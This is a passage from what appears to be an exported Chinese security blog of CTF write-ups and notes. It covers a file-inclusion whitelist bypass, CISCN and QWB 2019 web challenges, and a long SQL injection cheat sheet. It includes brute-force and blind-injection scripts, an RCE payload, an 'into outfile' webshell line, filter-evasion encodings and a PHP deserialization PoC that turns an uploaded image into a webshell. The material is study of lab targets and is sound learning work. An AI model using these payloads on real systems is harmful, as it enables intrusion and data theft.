不存在，那么这个文件包含等同于 : 在 1source.phps 文件夹目录下的上一级中的 cookie.txt ，也就是和 x.php 在同一目录下的 cookie.txt ，如果 1source.phps 存在，并且它是一个文件，那么肯定会报错，如果它是一个文件夹，也会成功包含 cookie.txt 。如果变为 include &#39;1source.phps/./cookie.txt&#39;; ，道理和上面相同 重新思考 代码如下 : 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748 &lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = ["source"=&gt;"source.php","hint"=&gt;"hint.php"]; if (! isset($page) || !is_string($page)) &#123; echo "you can't see it"; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo "you can't see it"; return false; &#125; &#125; if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) &#123; include $_REQUEST['file']; exit; &#125; else &#123; echo "&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"; &#125; ?&gt; 传入 file=hint.php ，在第一个 in_array 处会返回 true，然后直接包含 hint.php 传入 file=hint.php?/../cookie.txt ，在第二个 in_array 处会返回 true，第二个 in_array 中的 _page 为 hint.php ，然后包含 hint.php?/../cookie.txt ，但是这里的 ? 起到传递参数的作用而不是破坏路径 传入 file=hint.php%253f/../cookie.txt ，在第三个 in_array 处会返回 true ，第三个 in_array 中的 _page 为 hint.php ，然后包含 hint.php%3f/../cookie.txt ，这里的 %3f 即 ? ，破坏了路径，前面部分的路径不存在，可以包含后面的文件]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>CVE</tag>
        <tag>文件包含的路径</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019CISCN华南线下两道web复现]]></title>
    <url>%2F2019%2F06%2F25%2F2019CISCN%E5%8D%8E%E5%8D%97%E7%BA%BF%E4%B8%8B%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[原帖地址 : https://xz.aliyun.com/t/5558 2019CISCN华南线下的两个简单 web 部分题目下载地址，有的不完整 : 点我点我 web 1 考点 : 无参函数的 RCE 在注释中发现了 forgetpassword.php 页面 打开 forgetpassword.php，要求输入一个用户名，尝试用户名爆破，结果为 admin123 12345678910111213141516171819202122import requestsurl = "http://127.0.0.1/ciscn/web1/useri.php"response = "没有这个用户"f = open("./username.txt", "r", encoding="utf-8")for line in f: line = line.strip() data = &#123; "user_name" : line, &#125; r = requests.post(url=url, data=data) if response in r.text: continue else: print(line) break 输入 admin123 之后跳转到 useryzm.php 页面 提示验证码经过 base64 加密，而且验证码是 4 位的数字，写脚本爆破一下，结果验证码为 MTQyMw== 四位数字生成 123456for i in range(0,10000): s = str(i).zfill(4) print(s) f = open("num.txt",'a') f.write(s) f.write('\n') #实现换行的功能 爆破密码 123456789101112131415161718192021222324import requestsimport base64url = 'http://127.0.0.1/ciscn/web1/yzmi.php'f = open('./num.txt', 'r', encoding="utf-8")response = "错误"for line in f: line = line.strip().encode('utf-8') line = base64.b64encode(line) data = &#123; "yzm" : line.decode('utf-8'), &#125; r = requests.post(url=url, data=data) if response in r.text: continue else: print(line) break 输入后获得密码 f4h1l0t0j2g5b1m0a0m0a3d2d0 返回 index.html 输入账号密码，获得新提示，但是这里忘记复制数据库了，就直接跳到下一步吧，访问 mDjNaF.php mDjNaF.php 页面 看一下正则，preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])，\W 匹配任意字母和数字，(?R)? 重复整个模式，合在一起类似于匹配 x(y(z())) 样式的，且不能存在参数，输入 phpinfo(); 可以查看 phpinfo 页面 接下来就是构造无参数函数进行 RCE 了，想到可以更改 header 中的属性和值，使用无参数函数获取 header 处的值，达到 RCE 的目的。 对于 Cookie 属性，我们可以随意更改，session_id() 函数可以获取 PHPSESSID，如果没有开启 session 可以使用 session_start() 函数。由于不能带参数，我们可以将命令转化为 hex 再用 hex2bin() 函数转化。 payload : 123?code=eval(hex2bin(session_id(session_start())));// echo 'peri0d';Cookie: PHPSESSID=6563686f2027706572693064273b 还可以自己传参达到 RCE，get_defined_vars() 函数返回所有已定义的变量列表，然后利用提取位置的函数就可以实现 RCE payload : ?code=eval(end(current(get_defined_vars())));&amp;a=var_dump(scandir(&#39;../&#39;)) web 4 考点 : insert() 盲注 一个登录页面 试一试万能密码 admin&#39;# ，登录成功，并给出提示 经过 fuzz 发现过滤了空格，union，benchmark，sleep，regexp，order等很多很多关键字，空格可以使用 /**/ 绕过 给出了文件路径，可以使用 load_file 读取，再与 insert() 函数结合，使用异或，好像可以进行盲注 insert((select(load_file(&#39;/flag&#39;))),2,255,&#39;&#39;) 即在 flag 中，从第 2 个字符到第 255 个字符替换为空字符，即只显示第 1 个字符。insert((select(load_file(&#39;/flag&#39;))),3,255,&#39;&#39;)把第 3 个字符到第 255 个字符替换为空字符，即只显示前面两个字符。 脚本如下 1234567891011121314151617181920212223242526import requestsurl = 'http://172.27.137.145/ciscn/web4/index.php'# payload = "admin'^(select('f')&gt;(insert((select(load_file('/flag'))),2,255,'')))#"temp_list = []flag_list = []for i in range(2,255): payload_1 = "')&gt;(insert((select(load_file('/flag'))),"+str(i)+",255,'')))#" flag = ''.join(flag_list) temp_list.clear() for j in range(32, 127): payload = "admin'^(select('"+flag+chr(j)+payload_1 print(payload) data = &#123;'username' : payload,&#125; r = requests.post(url=url, data=data) if 'success' in r.text: temp_list.append(chr(j)) try: flag_list.append(temp_list.pop()) except: breakprint(''.join(flag_list)) 过滤语句 : 12345678if(preg_match("/union|benchmark|strcmp|locate|STRCMP|position|md5|mid|sub|concat|and|left|sleep|space|instr|conv|\s|right|cast|locate|limit|reverse|glob|having|match|count|pad|char|hex|regexp|order|group|ascii|information/i",$username))&#123; die('wafed!&lt;br&gt;');&#125;if(preg_match("/union|position|strcmp|locate|benchmark|STRCMP|concat|md5|mid|sub|sleep|and|left|cast|space|instr|pad|conv|\s|right|limit|reverse|locate|match|glob|having|count|char|hex|regexp|order|group|ascii|information/i",$passwd))&#123; die('wafed!&lt;br&gt;');&#125;]]></content>
      <categories>
        <category>CTF wp</category>
      </categories>
      <tags>
        <tag>CISCN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL 注入]]></title>
    <url>%2F2019%2F06%2F10%2FSQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[自己做的注入总结，包含了常见的问题，会随着比赛的扩充而扩充 一些问题sqli-labs 和 dvwa在用火狐时发现一个问题，在浏览器的URL栏输入 # 时，会把 # 后面的都注释掉，比如，127.0.0.1/index.php?id=1#qwerasdf，通过抓包发现请求的是127.0.0.1/index.php?id=1 由此得到结论，# 对于浏览器就是注释的意思。这也就解释了sqli-labs中在有些关卡在URL中输入 # 无效但是 %23 有效的状况 同样的在 Less-25 中，过滤了 and 和 or ，如果直接使用 &amp;&amp; ，是会报错的，应用 %26%26 在 dvwa 的注入中，在提交 id 时会对提交内容进行一次 URLencode，所以在那个框框里面输入 1’ %23 是无法起到注释作用的，通过抓包发现其请求的是 ?id=1’%2523，其中 %25 是 % 的URL编码。在sqli-labs的 POST 注入中也会出现上述情况。 一些闭合方式‘$id’，”$id”，(‘$id’)，(“$id”)，{“$id”}，{‘$id’} GET型注入判断类型字符型 12345?id=1&apos; //报错信息 &apos;1&apos;&apos; LIMIT 0,1 //有三个 &apos; ，猜 MySQL 语句 select * from table where id=&apos;$id&apos; near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1 ?id=1&apos;%23 //返回正常 数字型 12345?id=1&apos; //报错信息 &apos; LIMIT 0,1 //有一个 &apos; ，猜 MySQL 语句 select * from table where id=$id near &apos;&apos; LIMIT 0,1&apos; at line 1 ?id=1+1 //返回正常 判断查询字段数123?id=1&apos; union slect 1,2,3 %23 ?id=1&apos; order by 3 %23 //返回正确，说明MySQL为select column1,column2,column3 from table where id=&apos;$id&apos; 数据库1234//当前数据库 ?id=1&apos; uinon select databse(),2,3 %23 //所有数据库 ?id=1&apos; union select 1,select schema_name from INFORMATION_SCHEMA.schemata,3 %23 数据表1?id=1&apos; union select 1,select table_name from information_schema.tables where table_schema=&apos;xxx&apos;,3 %23 数据列1?id=1&apos; union select 1,select column_name from information_schema.columns where table_name=&apos;xxx&apos;,3 %23 数据内容1?id=1&apos; union select 1,select xxx from xxx,3 %23 布尔盲注一般布尔盲注中只会出现返回成功和返回失败的界面，不会有union联合查询的。 盲注分为布尔型，时间型和报错型。 首先判断注入类型，和以前相同，要注意二分法的应用。 数据库名称长度12//用二分法判断范围 ?id=1&apos; and length(database())=8 %23 //返回正确，说明数据库名称长度为8 数据库名称内容left判断 1?id=1&apos; and left(database(),1)=&apos;s&apos; %23 ?id=1&apos; and left(database(),2)=&apos;se&apos; %23 ?id=1&apos; and left(database(),8)=&apos;security&apos; %23 substr判断 1?id=1&apos; and ascii(substr(database(),1,1))=83 %23 ?id=1&apos; and ascii(substr(database(),2,1))=69 %23 ?id=1&apos; and substr(database(),1,8)=&apos;security&apos; %23 regexp判断 1?id=1&apos; and 1=(database() regexp &apos;^[a-z]&apos;) %23 ?id=1&apos; and 1=(database() regexp &apos;^s[a-z]&apos;) %23 ?id=1&apos; and 1=(database()=&apos;security&apos;) %23 mid判断 1?id=1&apos; and ord(mid(database(),1,1))=83 %23 ?id=1&apos; and ord(mid(database(),2,1))=69 %23 ?id=1&apos; and mid(database(),1,8)=&apos;security&apos; %23 数据表先用length()判断长度 1?id=1&apos; and length(select table_name from information_schema.tables where table_schema=database() limit 0,1)=5 %23 然后判断内容 12345678//left判断前两位 ?id=1&apos; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&apos;e&apos; %23 ?id=1&apos; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),2)=&apos;em&apos; %23 //substr判断第三位 ?id=1&apos; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1)=&apos;a&apos; %23 //regexp判断第四位 ?id=1&apos; and 1=(select 1 from information_schema.tables where table_schema=database() and table_name regexp &apos;^emai[a-z]&apos; limit 0,1) %23 //mid判断第五位 ?id=1&apos; and mid((seanlect table_name from information_schema.tables where table_schema=database() limit 0,1),4,1)=&apos;l&apos; %23 如果想判断第二个表，把 limit 0,1 改为 limit 1,1 即可 但是regexp中不可以，只要是table_name中的内容，regexp都可以匹配到 数据列1select table_name from information_schema.tables where table_schema=database() limit 0,1 改为 1select column_name from information_schema.columns where table_name=&apos;xxxx&apos; limit 0,1 再进行判断 数据内容1234//ifnull和cast函数，第一位为D ?id=1&apos; and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit 0,1),1,1))=68 %23 //普通方式，第二位为u ?id=1&apos; and ascii(substr((select username from security.users order by id limit 0,1),2,1))=85 %23 报错注入使用报错注入的前提是，当前页面能够 print_r(mysql_error()) 或者是 echo(mysql_error()) 后面 from 的表必须是存在的，比如 information_schema.tables 或者 information_schema.columns Floor报错这两种语句都可以，只是第一个知道字段数是3 1234//替换 select user() ?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a %23 //替换 select schema_name frominformation_schema.schemata limit 0,1 ?id=1&apos; and (select 1 from (select count(*),concat(((select schema_name frominformation_schema.schemata limit 0,1)),&apos;;&apos;,floor (rand(0)*2))x frominformation_schema.tables group by x)a) %23 简化版Floor报错注入 1select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2)) 如果关键的表被禁用了，可以使用这种形式 1select count(*) from (select 1 union select null union select !1)a group by concat(version(),floor(rand(0)*2)) 如果 rand 被禁用了可以使用用户变量来报错(实测未成功) 1select min(@a:=1) from information_schema.tables group by concat(password,@a:(@a+1)%2) Xpath报错这个很常用 1234//extractvalue ?id=1&apos; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) %23 //updatexml ?id=1&apos; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) %23 延时注入sleep()1?id=1&apos; and if(ascii(substr(database(),1,1))=115,1,sleep(10)) %23 benchmark()1?id=1&apos; union select (if(ascii(substr(current,1,1))=113,benchmark(50000000,encode(&apos;MSG&apos;,&apos;by 5 seconds&apos;)),null)),2,3 from (select database() as current) as tb1 %23 导入导出首先判断当前用户是否具有写入权限 1?id=1&apos;)) and (select count(*) from mysql.user)&gt;0 %23 //返回正确，说明有最高权限 将 select 内容导入文件，这里的 path 必须要是绝对路径 123select version() into outfile &quot;path&quot; //version()也可以换成一句话 select &lt;?php @eval($_post[&quot;a&quot;])?&gt; into outfile &quot;path&quot; 这里是可以直接 getshell 的 POST注入和 GET 注入类似，只是传输的数据不在 URL 中显示，有时需要抓包。常见于登陆的页面 最常见的一个，万能密码 1select username,password from users where username=&apos;$username&apos; and password=&apos;$password&apos; limit 0,1 提交 username=admin’ # password=1(任意密码) 即可登陆 有时候闭合方式会发生变换，有时候会对输入进行检测( check )，没有对哪里检测就从哪里注入(报错注入，布尔盲注，时间盲注，联合查询) 增删改常见于注册(insert)和修改内容(update)的页面，有时需要抓包 比如修改密码 1update users set password=&apos;$password&apos; where username=&apos;$username&apos; 在 password 或者 username 处注入，最常见的用报错注入。有时候闭合方式会发生变换，有时候会对输入进行检测( check )，没有对哪里检测就从哪里报错注入 这里也会造成二次注入，蓝鲸的一个题目 HEADER头注入抓包修改 header 头部，比如 user-agent，referer，cookie sqli-labs Less-18 12//Less-19的 referer 同理，也可以用 floor，updatexml 1&apos; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &apos;1&apos;=&apos;1 我觉得Less-18是要输入正确的 uname 和 pass 的，否则是无法显示 user-agent Less-20修改cookie 1uname=admin1&apos; and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) # 宽字节注入这里是针对 ‘ 和 \ 被过滤的情况，一般采用 addslashes() 和 mysql_real_escape_string() 函数 两者都是对 ‘ 和 \ 进行了 replace 处理，’ 转化为 &#39; ，\ 转化为 \，但是对数字型注入无效 绕过方法： 12345//GET型 ?id=-1%df%27 union select 1 %23 //POST型，以万能密码为例，&apos; 转为 utf-16 或者 utf-32 //此处 �&apos; 的 urlencode 为 %ef%bf%bd%27 name=�&apos; or 1=1 # &amp;pass=111 堆叠注入在 SQL 中，用分号( ; )来表示语句的结尾，如果再 ; 结束一个 SQL 语句之后继续构造下一条语句，是会在一起执行的。对比于 union 的查询语句，堆叠注入可以执行任意语句 例如 : 强网杯-随便注 insert() 盲注insert(str,pos,len,newstr) : 对字符串 str，从 pos 位置开始，长为 len 个字符的字符串用 newstr 替换 第一个，对于字符串 123456，从第 1 个位置开始，截取长度为 2 的字符串，即 12 用 xx 替换 第二个，对于字符串 123456，从第 2 个位置开始，截取长度为 2 的字符串，即 23 用 xx 替换 当 len 超过 str 的长度时 盲注细节如下 : ciscn 华南线下 web4 各种绕过过滤 # 和 –+1、union 联合查询，控制查询结果显示位置 1?id=-1&apos; union select 1,user(),&apos;3 2、利用 or ‘1’=’1 闭合 1?id=1 or extractvalue(1,concat(0x7e,(select user()),0x7e)) or &apos;1&apos;=&apos;1 3、编码绕过 1234567891011121314//url encode # = %23 //hex # = %23 --+ = %2D%2D%2B //unicode # = \u0023 --+ = \u002d\u002d\u002b //html encode --+ = &amp;#45;&amp;#45;&amp;#43; # = &amp;#35 过滤 and 和 or1、编码 1234567891011121314//大小写 Or OR oR AND //hex and = %61%6E%64 or = %6F%72 //unicode and = \u0061\u006e\u0064 or = \u006f\u0072 //html encode and = &amp;#97;&amp;#110;&amp;#100; or = &amp;#111;&amp;#114; 2、替换 123and = &amp;&amp; or = || //在 URL 栏中 &amp;&amp; 要换 %26%26 过滤空格1、特殊字符 123%a0 新建一行 %0b TAB垂直 /**/ 注释 2、编码 12345//unicode \u0020 //html encode&amp;#32; 过滤 union 和 select 等1、编码 1234567891011121314//大小写 UniON SelEcT //hex union = %75%6E%69%6F%6E select = %73%65%6C%65%63%74 //unicode union = \u0075\u006e\u0069\u006f\u006e select = \u0073\u0065\u006c\u0065\u0063\u0074 //html encode union = &amp;#32;&amp;#117;&amp;#110;&amp;#105;&amp;#111;&amp;#110;select = &amp;#115;&amp;#101;&amp;#108;&amp;#101;&amp;#99;&amp;#116; 2、重复(只过滤一次时) 12ununionionselselectect 3、注释 12/*!union*/ /*!select*/ 过滤 ‘ 和 \1、宽字节注入 2、编码 123456789101112131415//url encode &apos; = %27 \ = %5c //hex &apos; = %27 \ = %5c //unicode &apos; = \u0027 \ = \u005c //html encode &apos; = &amp;#39;\ = &amp;#92;]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[强网杯web复现]]></title>
    <url>%2F2019%2F06%2F05%2F2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[平台：https://buuoj.cn/challenges 2019 强网杯的题目总结 UPLOADwp大佬的 wp : https://www.zhaoj.in/read-5873.html 个人总结 只能上传正常的图片，非 png 格式会自动转化为 png，图片被保存在 upload 目录下 本题是 www.tar.gz 泄露，源码泄露总结点击此处 函数流程： 没有登陆时，跳转到 index.php，进行注册登陆。login_check 函数将 cookie(‘user’) 赋给 profile，然后 base64 解码反序列化 在注册页面调用 login_check 函数检查是否登陆，是则跳转到 index.php/home ，否则进行注册 在登陆页面调用 login_check 函数检查是否登陆，是则跳转到 index.php/home ，否则进行登陆 已经登陆时，跳转到 index.php/home 进行文件上传操作 在进行上传操作时，对请求头中的 REMOTE_ADDR 进行 md5 加密并赋给 upload_menu ，然后创建以 upload_menu 命名的文件夹 然后进行登陆检查，然后将文件的临时副本的名称赋给 filename_tmp，将文件名(不加后缀)进行 md5 加密后赋给 filename 然后进行后缀检测，将 filename 的后缀赋给 ext，如果 ext 为 png 返回 1，否则返回 0 如果后缀是 png，检查图片内容，然后将 filename 赋给 filename_tmp，将图片相对路径赋给 img，执行 update_img 函数 update_img 函数先进行 user 查询，如果 user 没有上传过图片并且 img 存在，则更新 user 表的 img 字段，并执行 update_cookie 函数 update_cookie 函数将上传图片的 img 进行序列化和 base64 编码后赋给 cookie 的 user profile 的 _call 和 _get 两个魔术方法，分别书写了在调用不可调用方法和不可调用成员变量时怎么做。__get 会直接从 except 里找，__call 会调用自身的 name 成员变量所指代的变量所指代的方法。 攻击流程： 注册，登陆。登陆之后有个跳转的过程，这里就有了 cookie，如图 解码后如图 选择上传图片，这个图片就是合成的图片马，从 阿里巴巴矢量图库 下载一个 png 图片，然后蚁剑生成一个 shell，用 hex 编辑器直接将 shell 内容放在图片后面即可。这里使用阿里的图库是因为网上的 png 图片可能 hex 格式不规范，导致后面改名之后会报 parse error 上传图片之后，会在 upload 目录下生成一个 md5(REMOTE_ADDR) 文件，而且文件名也会被 md5 加密，这时 cookie[‘user’] 如图 解码后如图 使用 poc 生成的序列化结果修改 cookie[‘user’]，刷新一次即可修改后缀。在服务器反序列化的过程中，在 Register 类中执行析构函数，调用 $profile 的 index() 函数，在 Profile 类的 __get 函数中定义了如果调用 index() 就去调用 img，而 __call 函数规定调用不可调用的函数时就调用 img 对应的函数，这样就控制函数跳转到 upload_img 函数，然后执行复制函数，将 png 改为 php，并删除原有的 png，至此，后缀修改完成。 最后直接用蚁剑连接 shell，读取配置文件中的数据库信息，选择 mysqli 驱动连接到数据库，即可读取 flag 最终 poc 如下，修改上传图片地址即可 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phpnamespace app\web\controller;class Profile&#123; public $checker; public $filename_tmp; public $filename; public $upload_menu; public $ext; public $img; public $except; public function __get($name) &#123; return $this-&gt;except[$name]; &#125; public function __call($name, $arguments) &#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125; &#125;&#125;class Register&#123; public $checker; public $registed; public function __destruct() &#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); &#125; &#125;&#125;$profile = new Profile();$profile-&gt;except = ['index' =&gt; 'img'];$profile-&gt;img = "upload_img";$profile-&gt;ext = "png";//修改地址即可$profile-&gt;filename_tmp = "../public/upload/24ff17b3e72d90d210f3455327ea52f7/36a767e7b2d8d3bde3f881217a418ebb5.png";$profile-&gt;filename = "../public/upload/24ff17b3e72d90d210f3455327ea52f7/6a767e7b2d8d3bde3f881217a418ebb5.php";$register = new Register();$register-&gt;registed = false;$register-&gt;checker = $profile;echo urlencode(base64_encode(serialize($register)));?&gt; mysqli 是 PHP 驱动数据库的一种方式，以前是使用 mysql 的，而 mysqli 相比于 mysql 更加安全高效 copy(a, b)，a 和 b 是文件路径，将文件从 a 拷贝到 b，比如 copy(“./1.png”, “./1.php” ) 执行之后会存在两个文件 1.png 和 1.php unlink(a)，a 是文件路径，删除文件 a 随便注wp 打开靶机，随便提交，发现似乎是把 PHP 查询的原始结果之间返回了 输入 select 发现了过滤语句，过滤了 select，update，delete，drop，insert，where 和 . return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject); 测试一下有没有注入。?inject=1&#39;%23，返回正常，字符型注入 过滤了这么多关键词，尝试堆叠注入。?inject=1&#39;;show databases;%23，看到了所有的数据库 再看一下所有的表。?inject=1&#39;;show tables;%23，1919810931114514 表和 words 表 flag 在全数字的表里，默认查询的是 words 表 12?inject=1&apos;;show columns from `1919810931114514`;%23?inject=1&apos;;show columns from `words`;%23 既然没过滤 alert 和 rename，那就可以把表和列改名。先把 words 改为 words1，再把数字表改为 words，然后把新的 words 表里的 flag 列改为 id ，这样就可以直接查询 flag 了 构造 payload 如下 1/?inject=1&apos;;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;%23 使用 /?inject=1&#39; or &#39;1&#39;=&#39;1 访问一下即可获得 flag 个人总结 MySQL中反引号和单引号的区别与用法 MySql 中用一对反引号来标注 SQL 语句中的标识，如数据库名、表名、字段名等 引号则用来标注语句中所引用的字符型常量或日期/时间型常量，即字段值 例如：select * from `username` where `name`=”peri0d” PHP 代码推测，这里只是一个大概的流程，和实际可能有出入。参照 sqli-labs 里的代码 1234567891011121314151617181920212223242526272829303132333435&lt;?phpfunction waf($inject)&#123;preg_match("/select|update|delete|drop|insert|where|\./i",$inject); die('return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);');&#125;if(isset($_GET['inject']))&#123; $id = $_GET['inject']; waf($id); $con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname); $sql = "select * from `words` where id = '$id';"; /* execute multi query */ if (mysqli_multi_query($con1, $sql))&#123; /* store first result set */ $result = mysqli_multi_query($con1); if ($result) &#123; if($row = mysqli_fetch_row($result)) &#123; var_dump($row); &#125; &#125; /* print divider */ if (mysqli_more_results($con1)) &#123; echo "&lt;hr&gt;"; &#125; &#125; mysqli_close($con1);&#125;?&gt; MySQL 的 show、rename 和 alter 命令 show 可以用于查看当前数据库，当前表，以及表中的字段 rename 用于修改 table 的名称 alter 用于修改表中字段的属性 攻击思路：默认查询 words 表，可以将数字表的名称改成 words，这样就可以 使用 or ‘1’=’1 直接查询 flag 了 高明的黑客]]></content>
      <categories>
        <category>CTF wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>QWB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP代码审计基础]]></title>
    <url>%2F2019%2F06%2F03%2FPHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[代码审计入门的小总结 常见 PHP 框架 ThinkPHP Yaf Laravel Kohana Codelgniter Yii Smyfony doitphp 先看用户手册 处理流程获取请求 =》全局过滤 =》模块文件 =》C函数内容 =》M函数内容 =》V显示 网站目录结构 主目录 模块目录 插件目录 上层目录 模板目录 数据目录 配置目录 配置文件 公共函数文件 安全过滤文件 数据库结构 入口文件 常见方法通读原文 函数集文件 配置文件 安全过滤文件 index 文件 适用于比较小的网站或者 CMS 敏感关键字回溯参数这是常见方法，但是不能了解程序的基本框架，覆盖不了逻辑漏洞 查找可控变量 可控变量 进入函数的变量 功能点定向审计 程序安装 文件上传 文件管理 登陆验证 备份恢复 找回密码 PHP核心配置语法 大小写敏感 运算符：|, &amp;, ~, ! 空值：foo = ; 或者 foo = none; 安全模式 安全模式 safe_mode = off 限制文档的存取，限制环境变量的存取，控制外部程序的执行 在 PHP5.4.0 被移除 限制环境变量存取 safe_mode_allowed_env_vars = string 指定 PHP 程序可以改变的环境变量的前缀 外部程序执行目录 safe_mode_exec_dir = &quot;path&quot; 禁用函数 disable_functions = 控制变量 全局变量注册开关 register_globals = off off 时服务端使用 $_GET[‘name’] 获取数据，on 时服务端通过 POST 或 GET 提交的数据将使用全局变量来接收 魔术引号自动过滤 magic_quotes_gpc = on 在 PHP5.4.0 被移除 远程文件 是否允许包含远程文件 allow_url_include = off 是否允许打开远程文件 allow_url_open = off 目录权限 HTTP 头部版本信息 expose_http = off 文件上传临时目录 upload_tmp_dir = 用户可访问目录 open_basedir = path 错误信息 内部错误选项 display_errors = on 错误报告级别 error_reporting = E_ALL&amp;~E_NOTICE 审计中涉及的超全局变量 全局变量 在函数外面定义的变量，不能在函数中直接使用。在函数中使用时加上global 超全局变量 作用域在所有脚本，比如$_GET，$_SERVER。除$_GET, $_POST, $_SERVER, $_COOKIE等之外的超全局变量保存在 $GLOBALS 数组中 $GLOBALS global 定义全局变量，只应用于当前网页而不是整个网站，可以视为参数的传递 $GLOBALS 在 PHP 脚本中的任意位置访问全局变量，可以视为变量的作用域设置全局 1234567891011121314151617&lt;?php$var1 = 1;$var2 = 2;function test1()&#123; $GLOBALS['var1'] = $GLOBALS['var2'];&#125;test1();echo $var1; //2function test2()&#123; global $var1,$var2; $var1 = $var2&#125;test2();echo $var1; //2?&gt; $_POST 和 $_GET POST 隐藏传参，将表单内各个字段与其内容放在 Request Header 内传给服务器 GET URL 传参，将参数放在提交表单的 ACTION 属性所指的 URL 中 $_REQUEST PHP 中 $_REQUEST 可以获取 以 POST 和 GET 方法提交的数据 尽量不要使用 $_SERVER 这种超全局变量保存关于报头、路径和脚本位置的信息 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。 数组 $_FILE 保存上传文件的信息 数组 $_SESSION 保存 SESSION 信息 数组 $_COOKIE 保存 COOKIE 信息 数组 $_ENV 包含服务器环境变量的数组 只是被动的接受服务器端的环境变量转换为数组 变量覆盖 变量未初始化，我们自定义的参数值可以替换程序原有的变量值 $$12345678&lt;?php$x = '123';$b = '456';$x = $_GET['x'];eval("var_dump($$x);");eval("var_dump($x);");?&gt; 变量 x 初始化为 ‘123’ 传入参数 ?x=b，$$x 就相当于 $b，这时的输出为 string(3) “456”，string(1) “b” 传入参数 ?x=x=789，$$x 相当于 ${x=789}，这时输出为 int(789)，int(789)，x 值以被覆盖 123456789101112131415161718192021222324&lt;?phpinclude "flag.php";$_403 = "Access Denied";$_200 = "Welcome Admin";if ($_SERVER["REQUEST_METHOD"] != "POST") die("CTF is here :p…");if ( !isset($_POST["flag"]) ) die($_403);foreach ($_GET as $key =&gt; $value) $$key = $$value;foreach ($_POST as $key =&gt; $value) $$key = $value;if ( $_POST["flag"] !== $flag ) die($_403);echo "This is your flag : ". $flag . "\n";die($_200);?&gt; payload：?_200=flag post：flag=1 通过 $$key=$$value 将 flag 的值赋给 _200，post 中的 flag 为：${flag}=1，所以 post 的值永远和 $flag 相同，接着利用 die($_200) 将真实的 flag 输出 extract() extract(array,extract_rules,prefix) extract() 函数使用数组键名作为变量名，使用数组键值作为变量值，创建这些变量。该函数返回成功设置的变量数目。 extract_rules 参数： EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。 EXTR_SKIP - 如果有冲突，不覆盖已有的变量。 EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。 EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。 EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。 EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。 EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。 EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。 12345678&lt;?php$a = "Original";$my_array = array("a" =&gt; "Cat", "b" =&gt; "Dog", "c" =&gt; "Horse");echo $a;extract($my_array);echo "\$a = $a; \$b = $b; \$c = $c";//Original $a = Cat; $b = Dog; $c = Horse?&gt; 12345678&lt;?phpif($_SERVER["REQUEST_METHOD"]=="POST")&#123; extract($_POST); if($pass == $password_hard)&#123; echo "peri0d".'&lt;br&gt;'; &#125;&#125;?&gt; payload：post：pass=123&amp;password_hard=123 传入的 $_POST 是一个数组，为 array(2) {[&quot;pass&quot;]=&gt;string(3) &quot;123&quot; [&quot;password_hard&quot;]=&gt;string(3) &quot;123&quot;} parse_str() 